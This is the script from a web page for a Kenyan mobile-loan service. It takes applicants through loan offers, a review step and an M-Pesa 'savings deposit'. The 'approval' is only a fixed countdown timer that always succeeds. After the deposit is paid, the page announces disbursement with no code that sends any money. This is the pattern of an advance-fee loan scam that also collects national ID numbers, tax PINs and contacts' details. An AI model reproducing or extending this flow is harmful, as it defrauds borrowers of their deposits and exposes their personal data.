                    steps[3].querySelector('i').className = 'fas fa-check-circle';
                    steps[3].querySelector('i').style.color = 'var(--success)';
                    steps[3].style.background = 'rgba(39, 174, 96, 0.15)';
                    steps[4].querySelector('i').className = 'fas fa-spinner fa-spin';
                    steps[4].querySelector('i').style.color = 'var(--primary)';
                    steps[4].style.opacity = '1';
                }
                
                if (seconds <= 0) {
                    clearInterval(interval);
                    loanApplication.status = 'offers_shown';
                    localStorage.setItem('loanApplication', JSON.stringify(loanApplication));
                    showPage('loan-offers-loading');
                    setTimeout(() => {
                        showPage('loan-offers');
                        populateLoanOfferDetails();
                    }, 5000);
                }
            }, 1000);
        }

        function populateLoanOfferDetails() {
            const app = JSON.parse(localStorage.getItem('loanApplication') || '{}');
            document.getElementById('loanOfferName').textContent = app.fullName || '-';
            document.getElementById('loanOfferId').textContent = app.idNumber ? '****' + app.idNumber.slice(-4) : '-';
            document.getElementById('loanOfferPhone').textContent = app.phone ? '+' + app.phone : '-';
        }

        window.selectLoanOffer = function(lender, amount, savings, receive, repayment, duration, interest) {
            const lenderNames = {
                'linker': 'Linker Mkopo',
                'pesa': 'Pesa Haraka',
                'mkopo': 'Mkopo Sasa'
            };
            
            selectedLoanOffer = {
                lender: lender,
                lenderName: lenderNames[lender],
                amount: amount,
                savings: savings,
                receive: receive,
                repayment: repayment,
                duration: duration,
                interest: interest
            };
            
            document.getElementById('popupLenderName').textContent = lenderNames[lender];
            document.getElementById('popupLoanAmount').textContent = 'KES ' + amount.toLocaleString();
            document.getElementById('popupSavings').textContent = 'KES ' + savings.toLocaleString();
            document.getElementById('popupReceive').textContent = 'KES ' + receive.toLocaleString();
            document.getElementById('popupRepayment').textContent = 'KES ' + repayment.toLocaleString();
            document.getElementById('popupDuration').textContent = duration + ' Days';
            
            document.getElementById('loanOfferPopup').classList.add('show');
        };

        window.confirmLoanSelection = function() {
            closeModal('loanOfferPopup');
            
            loanApplication = JSON.parse(localStorage.getItem('loanApplication') || '{}');
            loanApplication.selectedOffer = selectedLoanOffer;
            loanApplication.status = 'offer_selected';
            localStorage.setItem('loanApplication', JSON.stringify(loanApplication));
            
            showPage('loan-review');
            populateReviewPage();
        };

        function populateReviewPage() {
            const app = JSON.parse(localStorage.getItem('loanApplication') || '{}');
            
            const personalHtml = `
                <div style="display: flex; justify-content: space-between; padding: 10px; background: var(--light); border-radius: 8px;"><span>Full Name</span><span style="font-weight: 600;">${app.fullName || '-'}</span></div>
                <div style="display: flex; justify-content: space-between; padding: 10px; background: var(--light); border-radius: 8px;"><span>ID Number</span><span style="font-weight: 600;">****${(app.idNumber || '').slice(-4)}</span></div>
                <div style="display: flex; justify-content: space-between; padding: 10px; background: var(--light); border-radius: 8px;"><span>Phone</span><span style="font-weight: 600;">+${app.phone || '-'}</span></div>
                <div style="display: flex; justify-content: space-between; padding: 10px; background: var(--light); border-radius: 8px;"><span>County</span><span style="font-weight: 600;">${app.county ? app.county.charAt(0).toUpperCase() + app.county.slice(1) : '-'}</span></div>
                <div style="display: flex; justify-content: space-between; padding: 10px; background: var(--light); border-radius: 8px;"><span>Email</span><span style="font-weight: 600;">${app.email || '-'}</span></div>
            `;
            document.getElementById('reviewPersonalInfo').innerHTML = personalHtml;
            
            const emergencyHtml = `
                <div style="display: flex; justify-content: space-between; padding: 10px; background: var(--light); border-radius: 8px;"><span>Contact 1</span><span style="font-weight: 600;">${app.emergency1?.name || '-'} (${app.emergency1?.relationship || '-'})</span></div>
                <div style="display: flex; justify-content: space-between; padding: 10px; background: var(--light); border-radius: 8px;"><span>Contact 2</span><span style="font-weight: 600;">${app.emergency2?.name || '-'} (${app.emergency2?.relationship || '-'})</span></div>
            `;
            document.getElementById('reviewEmergencyContacts').innerHTML = emergencyHtml;
            
            const employmentHtml = `
                <div style="display: flex; justify-content: space-between; padding: 10px; background: var(--light); border-radius: 8px;"><span>Status</span><span style="font-weight: 600;">${app.employment ? app.employment.charAt(0).toUpperCase() + app.employment.slice(1) : '-'}</span></div>
                <div style="display: flex; justify-content: space-between; padding: 10px; background: var(--light); border-radius: 8px;"><span>Income Range</span><span style="font-weight: 600;">KES ${app.income || '-'}</span></div>
                <div style="display: flex; justify-content: space-between; padding: 10px; background: var(--light); border-radius: 8px;"><span>Employer</span><span style="font-weight: 600;">${app.employer || '-'}</span></div>
                <div style="display: flex; justify-content: space-between; padding: 10px; background: var(--light); border-radius: 8px;"><span>Purpose</span><span style="font-weight: 600;">${app.purpose ? app.purpose.charAt(0).toUpperCase() + app.purpose.slice(1) : '-'}</span></div>
            `;
            document.getElementById('reviewEmploymentInfo').innerHTML = employmentHtml;
            
            const offer = app.selectedOffer;
            if (offer) {
                const offerHtml = `
                    <div style="display: flex; justify-content: space-between; padding: 10px; background: linear-gradient(135deg, rgba(39, 174, 96, 0.1), rgba(46, 204, 113, 0.05)); border-radius: 8px;"><span>Lender</span><span style="font-weight: 700; color: var(--primary);">${offer.lenderName}</span></div>
                    <div style="display: flex; justify-content: space-between; padding: 10px; background: var(--light); border-radius: 8px;"><span>Loan Amount</span><span style="font-weight: 700; color: var(--success);">KES ${offer.amount.toLocaleString()}</span></div>
                    <div style="display: flex; justify-content: space-between; padding: 10px; background: var(--light); border-radius: 8px;"><span>Savings Required</span><span style="font-weight: 600; color: var(--warning);">KES ${offer.savings.toLocaleString()}</span></div>
                    <div style="display: flex; justify-content: space-between; padding: 10px; background: var(--light); border-radius: 8px;"><span>You Receive</span><span style="font-weight: 600;">KES ${offer.receive.toLocaleString()}</span></div>
                    <div style="display: flex; justify-content: space-between; padding: 10px; background: var(--light); border-radius: 8px;"><span>Repayment</span><span style="font-weight: 600;">KES ${offer.repayment.toLocaleString()}</span></div>
                    <div style="display: flex; justify-content: space-between; padding: 10px; background: var(--light); border-radius: 8px;"><span>Duration</span><span style="font-weight: 600;">${offer.duration} Days</span></div>
                `;
                document.getElementById('reviewLoanOffer').innerHTML = offerHtml;
            }
            
            document.getElementById('reviewReceivingPhone').value = (app.phone || '').replace('254', '');
        }

        window.editLoanSection = function(section) {
            window.editLoanReturnToReview = true;
            showPage('loan-eligibility');
            const app = JSON.parse(localStorage.getItem('loanApplication') || '{}');
            
            if (app.fullName) document.getElementById('loanFullName').value = app.fullName;
            if (app.idNumber) document.getElementById('loanIdNumber').value = app.idNumber;
            if (app.dob) document.getElementById('loanDob').value = app.dob;
            if (app.gender) document.getElementById('loanGender').value = app.gender;
            if (app.maritalStatus) document.getElementById('loanMarital').value = app.maritalStatus;
            if (app.phone) document.getElementById('loanPhone').value = app.phone.replace('254', '');
            if (app.county) {
                document.getElementById('loanCounty').value = app.county;
                updateLoanTowns();
            }
            if (app.town) document.getElementById('loanTown').value = app.town;
            if (app.address) document.getElementById('loanAddress').value = app.address;
            if (app.email) document.getElementById('loanEmail').value = app.email;
            if (app.emergency1) {
                document.getElementById('emergency1Name').value = app.emergency1.name || '';
                document.getElementById('emergency1Relationship').value = app.emergency1.relationship || '';
                document.getElementById('emergency1Phone').value = (app.emergency1.phone || '').replace('254', '');
            }
            if (app.emergency2) {
                document.getElementById('emergency2Name').value = app.emergency2.name || '';
                document.getElementById('emergency2Relationship').value = app.emergency2.relationship || '';
                document.getElementById('emergency2Phone').value = (app.emergency2.phone || '').replace('254', '');
            }
            if (app.employment) document.getElementById('loanEmployment').value = app.employment;
            if (app.income) document.getElementById('loanIncome').value = app.income;
            if (app.employer) document.getElementById('loanEmployer').value = app.employer;
            if (app.kraPin) document.getElementById('loanKraPin').value = app.kraPin;
            if (app.purpose) document.getElementById('loanPurpose').value = app.purpose;
            if (app.existingLoan) document.getElementById('loanExisting').value = app.existingLoan;
        };

        window.submitLoanReview = function() {
            const receivingPhone = document.getElementById('reviewReceivingPhone').value;
            if (!/^[71]\d{8}$/.test(receivingPhone)) {
                showToast('Please enter a valid Safaricom phone number', 'error');
                return;
            }
            
            loanApplication = JSON.parse(localStorage.getItem('loanApplication') || '{}');
            loanApplication.receivingPhone = '254' + receivingPhone;
            loanApplication.status = 'approving';
            localStorage.setItem('loanApplication', JSON.stringify(loanApplication));
            
            showPage('loan-approval-processing');
            startLoanApprovalTimer();
        };

        function startLoanApprovalTimer() {
            let seconds = 30;
            const timerEl = document.getElementById('loanApprovalTimer');
            const steps = document.querySelectorAll('#loanApprovalSteps .approval-step');
            
            const interval = setInterval(() => {
                seconds--;
                timerEl.textContent = seconds;
                
                if (seconds === 23) {
                    steps[1].querySelector('i').className = 'fas fa-check-circle';
                    steps[1].querySelector('i').style.color = 'var(--success)';
                    steps[2].querySelector('i').className = 'fas fa-spinner fa-spin';
                    steps[2].querySelector('i').style.color = 'var(--primary)';
                    steps[2].style.opacity = '1';
                }
                
                if (seconds === 15) {
                    steps[2].querySelector('i').className = 'fas fa-check-circle';
                    steps[2].querySelector('i').style.color = 'var(--success)';
                    steps[3].querySelector('i').className = 'fas fa-spinner fa-spin';
                    steps[3].querySelector('i').style.color = 'var(--primary)';
                    steps[3].style.opacity = '1';
                }
                
                if (seconds <= 0) {
                    clearInterval(interval);
                    loanApplication = JSON.parse(localStorage.getItem('loanApplication') || '{}');
                    loanApplication.status = 'approved';
                    localStorage.setItem('loanApplication', JSON.stringify(loanApplication));
                    showPage('loan-approved');
                    populateLoanApprovedPage();
                }
            }, 1000);
        }

        function populateLoanApprovedPage() {
            const app = JSON.parse(localStorage.getItem('loanApplication') || '{}');
            const offer = app.selectedOffer;
            
            if (offer) {
                document.getElementById('approvedLoanAmount').textContent = offer.amount.toLocaleString();
                document.getElementById('approvedSavingsAmount').textContent = 'KES ' + offer.savings.toLocaleString();
                document.getElementById('savingsBtnAmount').textContent = offer.savings.toLocaleString();
            }
            
            document.getElementById('approvedPhoneNumber').textContent = app.receivingPhone ? '+' + app.receivingPhone : '-';
            document.getElementById('approvedEmailHidden').textContent = app.email ? app.email.replace(/(.{3})(.*)(@.*)/, '$1****$3') : 'â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢@â€¢â€¢â€¢.com';
        }

        window.initiateSavingsDeposit = async function() {
            const app = JSON.parse(localStorage.getItem('loanApplication') || '{}');
            const offer = app.selectedOffer;
            
            if (!offer) {
                showToast('Please select a loan offer first', 'error');
                return;
            }
            
            const phone = (app.phone || '').replace('254', '');
            if (!phone) {
                showToast('Phone number not found', 'error');
                return;
            }
            
            const btn = document.getElementById('savingsDepositBtn');
            const statusDiv = document.getElementById('savingsDepositStatus');
            const statusText = document.getElementById('savingsStatusText');
            
            btn.disabled = true;
            btn.innerHTML = '<span class="spinner"></span> Sending STK Push...';
            statusDiv.style.display = 'block';
            statusText.textContent = 'Initiating M-Pesa payment...';
            
            try {
                const response = await fetch(`${API_BASE}/api/loan/savings-deposit`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    credentials: 'include',
                    body: JSON.stringify({
                        phone: app.phone,
                        amount: offer.savings,
                        email: app.email,
                        type: 'loan_savings'
                    })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    showToast('STK Push sent! Enter your M-Pesa PIN', 'success');
                    btn.innerHTML = '<i class="fas fa-mobile-alt"></i> Enter M-Pesa PIN on your phone';
                    statusText.textContent = 'Waiting for payment confirmation...';
                    pollLoanSavingsStatus(data.reference, offer.savings);
                } else {
                    throw new Error(data.message || 'Failed to initiate payment');
                }
            } catch (error) {
                console.error('Savings deposit error:', error);
                showToast(error.message || 'Failed to initiate payment. Please try again.', 'error');
                btn.disabled = false;
                btn.innerHTML = '<i class="fas fa-wallet"></i> Save KES ' + offer.savings.toLocaleString() + ' to Get Loan Now';
                statusDiv.style.display = 'none';
            }
        };

        function pollLoanSavingsStatus(reference, amount) {
            let attempts = 0;
            const maxAttempts = 60;
            const statusText = document.getElementById('savingsStatusText');
            const btn = document.getElementById('savingsDepositBtn');
            const statusDiv = document.getElementById('savingsDepositStatus');
            
            if (loanSavingsPollingInterval) clearInterval(loanSavingsPollingInterval);
            
            loanSavingsPollingInterval = setInterval(async () => {
                attempts++;
                
                if (attempts > maxAttempts) {
                    clearInterval(loanSavingsPollingInterval);
                    statusDiv.style.display = 'none';
                    btn.disabled = false;
                    btn.innerHTML = '<i class="fas fa-wallet"></i> Save KES ' + amount.toLocaleString() + ' to Get Loan Now';
                    showToast('Payment timed out. Please try again.', 'error');
                    return;
                }
                
                try {
                    const response = await fetch(`${API_BASE}/api/loan/savings-status/${reference}`);
                    const data = await response.json();
                    
                    if (data.status === 'completed') {
                        clearInterval(loanSavingsPollingInterval);
                        statusDiv.style.display = 'none';
                        showToast('Savings deposit confirmed! Your loan will be processed.', 'success');
                        
                        loanApplication = JSON.parse(localStorage.getItem('loanApplication') || '{}');
                        loanApplication.status = 'savings_paid';
                        loanApplication.savingsReference = reference;
                        localStorage.setItem('loanApplication', JSON.stringify(loanApplication));
                        
                        btn.innerHTML = '<i class="fas fa-check-circle"></i> Savings Confirmed - Processing Loan...';
                        btn.style.background = 'var(--success)';
                        
                        setTimeout(() => {
                            showToast('Loan processing complete! Check your M-Pesa for disbursement.', 'success');
                            loanApplication.status = 'disbursed';
                            localStorage.setItem('loanApplication', JSON.stringify(loanApplication));
                        }, 3000);
                        
                    } else if (data.status === 'failed') {
                        clearInterval(loanSavingsPollingInterval);
                        statusDiv.style.display = 'none';
                        btn.disabled = false;
                        btn.innerHTML = '<i class="fas fa-wallet"></i> Save KES ' + amount.toLocaleString() + ' to Get Loan Now';
                        showToast(data.message || 'Payment failed. Please try again.', 'error');
                    } else {
                        statusText.textContent = `Waiting for confirmation... (${attempts}s)`;
                    }
                } catch (error) {
                    console.error('Polling error:', error);
                }
            }, 2000);
        }

        // Auto-refresh loan savings balance
        function refreshLoanSavingsBalance() {
            const email = localStorage.getItem('userEmail');
            if (!email) return;
            
            fetch(`${API_BASE}/api/users/by-email/${encodeURIComponent(email)}`)
                .then(res => res.json())
                .then(data => {
                    if (data.success && data.user) {
                        const savingsBalance = parseFloat(data.user.loan_savings_balance || 0);
                        // Could display this somewhere if needed
                    }
                })
                .catch(err => console.error('Failed to refresh savings balance:', err));
        }

        // Add CSS animation for testimonials
        const style = document.createElement('style');
        style.textContent = `
            @keyframes scrollTestimonials {
                0% { transform: translateX(0); }
                33% { transform: translateX(0); }
                38% { transform: translateX(-100%); }
                66% { transform: translateX(-100%); }
                71% { transform: translateX(-200%); }
                95% { transform: translateX(-200%); }
                100% { transform: translateX(0); }
            }
            .loan-offer-card { position: relative; }
            .loan-offer-card:hover { transform: translateY(-3px); box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
            .live-indicator { width: 10px; height: 10px; background: var(--success); border-radius: 50%; animation: pulse 1s infinite; }
            @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
        `;
        document.head.appendChild(style);
    </script>
</body>
</html>
